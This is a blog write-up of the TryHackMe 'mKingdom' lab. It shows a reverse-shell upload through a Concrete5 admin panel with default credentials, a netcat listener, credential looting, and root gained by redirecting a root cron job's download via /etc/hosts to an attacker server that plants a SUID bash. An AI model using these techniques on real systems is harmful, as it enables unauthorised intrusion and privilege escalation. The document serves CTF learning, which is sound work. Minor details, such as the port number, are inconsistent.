<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>mKingdom :: northmatrix</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Overview mKingdom is an easy rated TryHackMe room focused on privilege escalation.
Initial Enumeration I begin with an namp scan against the target.
root@ip-10-10-73-173:~# nmap -T5 -p- 10.10.63.127 Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-13 01:59 BST Nmap scan report for ip-10-10-63-127.eu-west-1.compute.internal (10.10.63.127) Host is up (0.00031s latency). Not shown: 65534 closed ports PORT STATE SERVICE 85/tcp open mit-ml-dev MAC Address: 02:87:BD:95:3E:13 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 2.10 seconds From this i can see that only 1 port is open, port 86. After visiting this i see it is a webserver and i am greeted with an image of bowser.
" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="//localhost:1313/posts/2025-07-13-mkingdom/" />





  
  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">


<link rel="stylesheet" href="//localhost:1313/terminal.css">




<link rel="shortcut icon" href="//localhost:1313/favicon.png">
<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="northmatrix.github.io" />
  
    <meta name="twitter:creator" content="northmatrix" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="mKingdom">
<meta property="og:description" content="Overview mKingdom is an easy rated TryHackMe room focused on privilege escalation.
Initial Enumeration I begin with an namp scan against the target.
root@ip-10-10-73-173:~# nmap -T5 -p- 10.10.63.127 Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-13 01:59 BST Nmap scan report for ip-10-10-63-127.eu-west-1.compute.internal (10.10.63.127) Host is up (0.00031s latency). Not shown: 65534 closed ports PORT STATE SERVICE 85/tcp open mit-ml-dev MAC Address: 02:87:BD:95:3E:13 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 2.10 seconds From this i can see that only 1 port is open, port 86. After visiting this i see it is a webserver and i am greeted with an image of bowser.
" />
<meta property="og:url" content="//localhost:1313/posts/2025-07-13-mkingdom/" />
<meta property="og:site_name" content="northmatrix" />

  <meta property="og:image" content="//localhost:1313/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">

  <meta property="article:section" content="tryhackme" />













  
    <script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
></script>
<script>
  MathJax = {
    tex: {
      displayMath: [
        ["\\[", "\\]"],
        ["$$", "$$"],
      ], 
      inlineMath: [
        ["\\(", "\\)"],
        ["$", "$"],
      ], 
    },
    loader: {
      load: ["ui/safe"],
    },
    chtml: {
      scale: 1.4,
    },
  };
</script>

  
  <link rel="stylesheet" href="/css/syntax.css">
</head>
<body>


<div class="container full">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Northmatrix
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;â–¾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/showcase">Showcase</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about" >About</a></li>
        
      
        
          <li><a href="/showcase" >Showcase</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="//localhost:1313/posts/2025-07-13-mkingdom/">mKingdom</a>
  </h1>
  <div class="post-meta"><span class="post-author">northmatrix</span><span class="post-reading-time">6 min read (1227 words)</span></div>

  
    <span class="post-tags">
      
      #<a href="//localhost:1313/tags/rev-shell/">rev-shell</a>&nbsp;
      
      #<a href="//localhost:1313/tags/priv-esc/">priv-esc</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <h2 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>mKingdom is an easy rated TryHackMe room focused on privilege escalation.</p>
<p><img src="Pasted%20image%2020250713125235.png" alt=""></p>
<h2 id="initial-enumeration">Initial Enumeration<a href="#initial-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>I begin with an namp scan against the target.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@ip-10-10-73-173:~# nmap -T5 -p- 10.10.63.127
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-13 01:59 BST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> ip-10-10-63-127.eu-west-1.compute.internal <span class="o">(</span>10.10.63.127<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00031s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65534</span> closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">85/tcp open  mit-ml-dev
</span></span><span class="line"><span class="cl">MAC Address: 02:87:BD:95:3E:13 <span class="o">(</span>Unknown<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 2.10 seconds
</span></span></code></pre></div><p>From this i can see that only 1 port is open, port 86. After visiting this i see it is a webserver and i am greeted with an image of bowser.</p>
<p><img src="Pasted%20image%2020250713130439.png" alt=""></p>
<p>Looking at the page source nothing stands out so i begin scanning for directories below is the gobuster command i ran to achieve this.</p>
<pre tabindex="0"><code>root@ip-10-10-73-173:~/Mario# gobuster dir -u http://10.10.120.54:85 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.120.54:85
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 283]
/.htpasswd            (Status: 403) [Size: 288]
/app                  (Status: 301) [Size: 312] [--&gt; http://10.10.120.54:85/app/]
/index.html           (Status: 200) [Size: 647]
/server-status        (Status: 403) [Size: 292]
Progress: 4655 / 4656 (99.98%)
===============================================================
Finished
===============================================================
</code></pre><p>Going to the /app directory discovered in the scan displayed a green <strong>JUMP</strong> button.</p>
<p><img src="Pasted%20image%2020250713130457.png" alt=""></p>
<p>After clicking it displayed an alert on my screen and then took me to a personal website built using Concrete5 CMS. Displaying a blog about mushrooms.</p>
<p><img src="Pasted%20image%2020250713130527.png" alt=""></p>
<p>Looking at exploits for this CMS yielded nothing so i began testing default credentials on the login page to see if i good easily gain access.</p>
<p><img src="Pasted%20image%2020250713130602.png" alt=""></p>
<h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>After testing a few credentials i found the username and password to be what looks like Concrete5 CMS default credentials and now had access to the admin dashboard. From here i began looking for ways to upload a php reverse shell to the server.</p>
<p><img src="Pasted%20image%2020250713130641.png" alt=""></p>
<p>Looking at the side panel under the System &amp; Settings there was an option to add accepted file types i added php to this list.</p>
<p><img src="Pasted%20image%2020250713130841.png" alt=""></p>
<p>Now i could upload my php reverse shell to the server. making sure to also be listening for connections with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nlvp <span class="m">1234</span>
</span></span></code></pre></div><p><img src="Pasted%20image%2020250713131427.png" alt=""></p>
<p>I used Pentestmonkeys PHP Reverse Shell in this particular case from <a href="https://www.revshells.com/">https://www.revshells.com/</a>. When the file had finished upload it then greeted me with a popup specifying the uploads success and the url i could visit to see the file upon visiting this ulr my listener caught the reverse shell.</p>
<p><img src="Pasted%20image%2020250713131722.png" alt=""></p>
<p>I now had a foothold on the server as user www-data. From here i began stabalising my netcat shell with the following commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
</span></span><span class="line"><span class="cl">CTRL+Z
</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">stty rows &lt;rows&gt; cols &lt;cols&gt;
</span></span></code></pre></div><p><img src="Pasted%20image%2020250713132440.png" alt=""></p>
<h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Now all i needed to do was find a way to escalate my privileges i initially began by looking for the following:</p>
<ol>
<li>system wide cron jobs at <code>/etc/crontab</code></li>
<li>file capabilities with <code>getcap -r / 2&gt;/dev/null</code></li>
<li>searching for SUID/GUID binaries with <code>find / -type f -perm -04000 2&gt;/dev/null</code></li>
</ol>
<p>I was able to find the cat command had its SUID bit set however it was not owned by root but instead by toad so usefulness was limited. At this point i began trying to look inside the toad users $HOME directory using the cat command attempting to find ssh private keys or passwords in <code>.bash_history</code> but could not find anything. After this i began looking in the web applications directory located at <code>/var/www/html</code> here i was trying to look for reused credentials maybe to connect to database or as a users password in a database stored as a hash. Looking in the <code>/var/www/html/app/castle/application/config</code> directory i found a file called <code>database.php</code> i was not able to view this with cat but it worked fine with vi.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;default-connection&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;concrete&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;connections&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;concrete&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;driver&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;c5_pdo_mysql&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;server&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;database&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;mKingdom&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;toad&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;to********est&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;character_set&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;utf8&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;collation&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;utf8_unicode_ci&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span>
</span></span><span class="line"><span class="cl"><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="o">~</span>                                                                               
</span></span><span class="line"><span class="cl"><span class="o">~</span>                                                                               
</span></span><span class="line"><span class="cl"><span class="o">~</span>
</span></span></code></pre></div><p>Using this password i was able to gain access to toads account. From here i attempted the same Privilege Escalation enumeration checks as earlier but this time also checking what commands i could run with sudo with <code>sudo -l</code>. Unfortunately i did not have sudo access. After a while of searching i eventually checked the environment variables and found a variable <code>PWD_token</code> that contained a base64 encoded string.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">toad@mkingdom:~$ env
</span></span><span class="line"><span class="cl"><span class="nv">XDG_SESSION_ID</span><span class="o">=</span>c2
</span></span><span class="line"><span class="cl"><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
</span></span><span class="line"><span class="cl"><span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span>toad
</span></span><span class="line"><span class="cl"><span class="nv">LS_COLORS</span><span class="o">=</span><span class="nv">rs</span><span class="o">=</span>0:di<span class="o">=</span>01<span class="p">;</span>34:ln<span class="o">=</span>01<span class="p">;</span>36:mh<span class="o">=</span>00:pi<span class="o">=</span>40<span class="p">;</span>33:so<span class="o">=</span>01<span class="p">;</span>35:do<span class="o">=</span>01<span class="p">;</span>35:bd<span class="o">=</span>40<span class="p">;</span>33<span class="p">;</span>01:cd<span class="o">=</span>40<span class="p">;</span>33<span class="p">;</span>01:or<span class="o">=</span>40<span class="p">;</span>31<span class="p">;</span>01:su<span class="o">=</span>37<span class="p">;</span>41:sg<span class="o">=</span>30<span class="p">;</span>43:ca<span class="o">=</span>30<span class="p">;</span>41:tw<span class="o">=</span>30<span class="p">;</span>42:ow<span class="o">=</span>34<span class="p">;</span>42:st<span class="o">=</span>37<span class="p">;</span>44:ex<span class="o">=</span>01<span class="p">;</span>32:*.tar<span class="o">=</span>01<span class="p">;</span>31:*.tgz<span class="o">=</span>01<span class="p">;</span>31:*.arj<span class="o">=</span>01<span class="p">;</span>31:*.taz<span class="o">=</span>01<span class="p">;</span>31:*.lzh<span class="o">=</span>01<span class="p">;</span>31:*.lzma<span class="o">=</span>01<span class="p">;</span>31:*.tlz<span class="o">=</span>01<span class="p">;</span>31:*.txz<span class="o">=</span>01<span class="p">;</span>31:*.zip<span class="o">=</span>01<span class="p">;</span>31:*.z<span class="o">=</span>01<span class="p">;</span>31:*.Z<span class="o">=</span>01<span class="p">;</span>31:*.dz<span class="o">=</span>01<span class="p">;</span>31:*.gz<span class="o">=</span>01<span class="p">;</span>31:*.lz<span class="o">=</span>01<span class="p">;</span>31:*.xz<span class="o">=</span>01<span class="p">;</span>31:*.bz2<span class="o">=</span>01<span class="p">;</span>31:*.bz<span class="o">=</span>01<span class="p">;</span>31:*.tbz<span class="o">=</span>01<span class="p">;</span>31:*.tbz2<span class="o">=</span>01<span class="p">;</span>31:*.tz<span class="o">=</span>01<span class="p">;</span>31:*.deb<span class="o">=</span>01<span class="p">;</span>31:*.rpm<span class="o">=</span>01<span class="p">;</span>31:*.jar<span class="o">=</span>01<span class="p">;</span>31:*.war<span class="o">=</span>01<span class="p">;</span>31:*.ear<span class="o">=</span>01<span class="p">;</span>31:*.sar<span class="o">=</span>01<span class="p">;</span>31:*.rar<span class="o">=</span>01<span class="p">;</span>31:*.ace<span class="o">=</span>01<span class="p">;</span>31:*.zoo<span class="o">=</span>01<span class="p">;</span>31:*.cpio<span class="o">=</span>01<span class="p">;</span>31:*z<span class="o">=</span>01<span class="p">;</span>31:*.rz<span class="o">=</span>01<span class="p">;</span>31:*.jpg<span class="o">=</span>01<span class="p">;</span>35:*.jpeg<span class="o">=</span>01<span class="p">;</span>35:*.gif<span class="o">=</span>01<span class="p">;</span>35:*.bmp<span class="o">=</span>01<span class="p">;</span>35:*.pbm<span class="o">=</span>01<span class="p">;</span>35:*.pgm<span class="o">=</span>01<span class="p">;</span>35:*.ppm<span class="o">=</span>01<span class="p">;</span>35:*.tga<span class="o">=</span>01<span class="p">;</span>35:*.xbm<span class="o">=</span>01<span class="p">;</span>35:*.xpm<span class="o">=</span>01<span class="p">;</span>35:*.tif<span class="o">=</span>01<span class="p">;</span>35:*.tiff<span class="o">=</span>01<span class="p">;</span>35:*.png<span class="o">=</span>01<span class="p">;</span>35:*.svg<span class="o">=</span>01<span class="p">;</span>35:*.svgz<span class="o">=</span>01<span class="p">;</span>35:*.mng<span class="o">=</span>01<span class="p">;</span>35:*.pcx<span class="o">=</span>01<span class="p">;</span>35:*.mov<span class="o">=</span>01<span class="p">;</span>35:*.mpg<span class="o">=</span>01<span class="p">;</span>35:*.mpeg<span class="o">=</span>01<span class="p">;</span>35:*.m2v<span class="o">=</span>01<span class="p">;</span>35:*.mkv<span class="o">=</span>01<span class="p">;</span>35:*.webm<span class="o">=</span>01<span class="p">;</span>35:*.ogm<span class="o">=</span>01<span class="p">;</span>35:*.mp4<span class="o">=</span>01<span class="p">;</span>35:*.m4v<span class="o">=</span>01<span class="p">;</span>35:*.mp4v<span class="o">=</span>01<span class="p">;</span>35:*.vob<span class="o">=</span>01<span class="p">;</span>35:*.qt<span class="o">=</span>01<span class="p">;</span>35:*.nuv<span class="o">=</span>01<span class="p">;</span>35:*.wmv<span class="o">=</span>01<span class="p">;</span>35:*.asf<span class="o">=</span>01<span class="p">;</span>35:*.rm<span class="o">=</span>01<span class="p">;</span>35:*.rmvb<span class="o">=</span>01<span class="p">;</span>35:*.flc<span class="o">=</span>01<span class="p">;</span>35:*.avi<span class="o">=</span>01<span class="p">;</span>35:*.fli<span class="o">=</span>01<span class="p">;</span>35:*.flv<span class="o">=</span>01<span class="p">;</span>35:*.gl<span class="o">=</span>01<span class="p">;</span>35:*.dl<span class="o">=</span>01<span class="p">;</span>35:*.xcf<span class="o">=</span>01<span class="p">;</span>35:*.xwd<span class="o">=</span>01<span class="p">;</span>35:*.yuv<span class="o">=</span>01<span class="p">;</span>35:*.cgm<span class="o">=</span>01<span class="p">;</span>35:*.emf<span class="o">=</span>01<span class="p">;</span>35:*.axv<span class="o">=</span>01<span class="p">;</span>35:*.anx<span class="o">=</span>01<span class="p">;</span>35:*.ogv<span class="o">=</span>01<span class="p">;</span>35:*.ogx<span class="o">=</span>01<span class="p">;</span>35:*.aac<span class="o">=</span>00<span class="p">;</span>36:*.au<span class="o">=</span>00<span class="p">;</span>36:*.flac<span class="o">=</span>00<span class="p">;</span>36:*.mid<span class="o">=</span>00<span class="p">;</span>36:*.midi<span class="o">=</span>00<span class="p">;</span>36:*.mka<span class="o">=</span>00<span class="p">;</span>36:*.mp3<span class="o">=</span>00<span class="p">;</span>36:*.mpc<span class="o">=</span>00<span class="p">;</span>36:*.ogg<span class="o">=</span>00<span class="p">;</span>36:*.ra<span class="o">=</span>00<span class="p">;</span>36:*.wav<span class="o">=</span>00<span class="p">;</span>36:*.axa<span class="o">=</span>00<span class="p">;</span>36:*.oga<span class="o">=</span>00<span class="p">;</span>36:*.spx<span class="o">=</span>00<span class="p">;</span>36:*.xspf<span class="o">=</span>00<span class="p">;</span>36:
</span></span><span class="line"><span class="cl"><span class="nv">PWD_token</span><span class="o">=</span><span class="nv">aWthVGVOVEFOdEVTCg</span><span class="o">==</span>
</span></span><span class="line"><span class="cl"><span class="nv">MAIL</span><span class="o">=</span>/var/mail/toad
</span></span><span class="line"><span class="cl"><span class="nv">PATH</span><span class="o">=</span>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span></span><span class="line"><span class="cl"><span class="nv">QT_QPA_PLATFORMTHEME</span><span class="o">=</span>appmenu-qt5
</span></span><span class="line"><span class="cl"><span class="nv">PWD</span><span class="o">=</span>/home/toad
</span></span><span class="line"><span class="cl"><span class="nv">LANG</span><span class="o">=</span>en_US.UTF-8
</span></span><span class="line"><span class="cl"><span class="nv">SHLVL</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="nv">HOME</span><span class="o">=</span>/home/toad
</span></span><span class="line"><span class="cl"><span class="nv">LOGNAME</span><span class="o">=</span>toad
</span></span><span class="line"><span class="cl"><span class="nv">LESSOPEN</span><span class="o">=</span><span class="p">|</span> /usr/bin/lesspipe %s
</span></span><span class="line"><span class="cl"><span class="nv">XDG_RUNTIME_DIR</span><span class="o">=</span>/run/user/1002
</span></span><span class="line"><span class="cl"><span class="nv">LESSCLOSE</span><span class="o">=</span>/usr/bin/lesspipe %s %s
</span></span><span class="line"><span class="cl"><span class="nv">_</span><span class="o">=</span>/usr/bin/env
</span></span></code></pre></div><p>Upon decoding this i saw what looked to be a password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">toad@mkingdom:~$ <span class="nb">echo</span> -n <span class="s2">&#34;aWthVGVOVEFOdEVTCg==&#34;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">i*********S
</span></span></code></pre></div><p>Trying this password on the mario user account granted me access. And i now had access to the first flag user.txt located in marios home directory. At this point i was a bit stuck as i had looked at all the usual privilege escalation vectors such as SUID,sudo,capabilities,cronjobs,PATH and process inspection. So at this point i decided to try out an automated script to see if it would have any better luck. I used the <a href="https://github.com/DominicBreuker/pspy">pspy</a> tool to monitor linux processes without root to see if there was anything i was missing. In order to get it onto the target machine i downloaded the precmopiled binary onto my attacking machine and then started a simple python webserver and downloaded it on to the target in using the wget command. Running it here showed that there was a root cronjob running every so often.</p>
<p><img src="Pasted%20image%2020250713024327.png" alt=""></p>
<p>After looking at the counter.sh i saw that it was owned by root and was not writable so this ruined my first idea of modifying the script but after looking at it more carefully i noticed it was using the mkingdom.thm hostname to resolve the ip address and fetch the script. From here i decided to change the ip address that mkingdom.thm resolved to by modifying its entry in the <code>/etc/hosts</code> file to be that of my attacking machine.</p>
<pre tabindex="0"><code>127.0.0.1       localhost
10.10.245.60    mkingdom.thm
127.0.0.1       backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre><p>This way i could get it to execute arbitrary code as root. On my target machine i copied the file structure of <code>/app/castle/application/counter.sh</code> and put the following contents into the <code>counter.sh</code> script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cp /bin/bash /tmp/rootbash
</span></span><span class="line"><span class="cl">chmod u+s /tmp/rootbash
</span></span></code></pre></div><p>I then ran a python http server with the following command making sure to run it on port 85 to match with cronjob. Below is the series of commands i executed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-245-60:~/app/castle/application# cat counter.sh 
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">cp /bin/bash /tmp/rootbash
</span></span><span class="line"><span class="cl">chmod u+s /tmp/rootbash
</span></span><span class="line"><span class="cl">root@ip-10-10-245-60:~/app/castle/application# <span class="nb">cd</span>
</span></span><span class="line"><span class="cl">root@ip-10-10-245-60:~# sudo python3 -m http.server <span class="m">85</span>
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">85</span> <span class="o">(</span>http://0.0.0.0:85/<span class="o">)</span> ...
</span></span></code></pre></div><p>After waiting a few minutes the server reached out to the attacking machine downloaded the script and ran it.</p>
<pre tabindex="0"><code>10.10.49.125 - - [13/Jul/2025 13:35:02] &#34;GET /app/castle/application/counter.sh HTTP/1.1&#34; 200 -
</code></pre><p>After visiting /tmp i then saw the rootbash binary with the suid bit set and owned by root.</p>
<p><img src="Pasted%20image%2020250713133604.png" alt=""></p>
<p>Running <code>./rootbash -p</code> gave me a root shell and i was now able to easily view the root flag located in /root/user.txt with vi.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rootbash-4.3# ls
</span></span><span class="line"><span class="cl">Desktop    Downloads  Pictures	Templates  Videos
</span></span><span class="line"><span class="cl">Documents  Music      Public	user.txt
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rootbash-4.3# vi user.txt
</span></span></code></pre></div>
      </div></div>

  
    
<div class="pagination">
  <div class="pagination__title">
    <span class="pagination__title-h">Read other posts</span>
    <hr />
  </div>
  <div class="pagination__buttons">
    
      <a href="//localhost:1313/posts/2025-07-20-jack/" class="button inline prev">
        &lt; [<span class="button__text">Jack</span>]
      </a>
    
    
      ::
    
    
      <a href="//localhost:1313/posts/2025-08-04-order/" class="button inline next">
         [<span class="button__text">Order</span>] &gt;
      </a>
    
  </div>
</div>


  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>Â© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
